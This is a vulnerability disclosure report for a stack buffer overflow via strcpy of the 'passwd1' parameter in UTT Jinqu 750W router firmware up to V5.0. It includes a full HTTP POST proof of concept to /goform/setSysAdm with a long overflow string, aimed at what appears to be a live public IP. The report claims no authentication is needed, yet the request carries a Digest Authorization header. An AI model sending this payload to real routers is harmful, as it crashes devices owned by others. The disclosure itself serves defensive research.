# Information

**Vendor of the products:**   UTT

**Vendor's website:** [UTT艾泰-专业路由器、交换机、防火墙品牌](https://utt.com.cn/)

**Reported by:  **chengsihan(2216760375@qq.com)

**Affected products:** 进取 750W

**Affected firmware version:**  <=V5.0

**Firmware download address:** [UTT艾泰-专业路由器、交换机、防火墙品牌](https://utt.com.cn/downloadfile.php?id=2599)

# Overview

A critical overflow vulnerability exists in the Jinqu 750W router.
Attackers can exploit 'strcpy' by crafting the 'passwd1' parameter, allowing them to perform a stack overflow without authentication or authorization.
This vulnerability is eventually defined by a call to 'strcpy(InstPointByName + 36, var); ）; ' triggered, thereby leading to a denial of service

# Vulnerability details

The API for invoking the function

![image-20250603213130262](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202506032131300.png)



A stack overflow vulnerability was triggered in this place，Passwd1 passes in a large amount of content and splices it into InstPointByName memory, causing a stack overflow

![image-20250603213226847](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202506032132001.png)

# POC

```
POST /goform/setSysAdm HTTP/1.1
Host: 111.39.48.97:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://111.39.48.97:8888
Authorization: Digest username="admin", realm="UTT", nonce="3a7cfea98fca622944e3df8199d78bfe", uri="/goform/formArpBindGlobalConfig", algorithm=MD5, response="6f3cda7e88058bd1bfd99dfc42f82cb7", opaque="5ccc069c403ebaf9f0171e9517f40e41", qop=auth, nc=0000005d, cnonce="7483d218c63b6cec"
Connection: keep-alive
Referer: http://111.39.48.97:8888/IPMac.asp
Cookie: td_cookie=1399442376; language=zhcn; utt_bw_rdevType=
Upgrade-Insecure-Requests: 1
Priority: u=4

passwd1=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac

```



effect

![image-20250603213919341](https://newym666.oss-cn-wuhan-lr.aliyuncs.com/photo/202506032139371.png)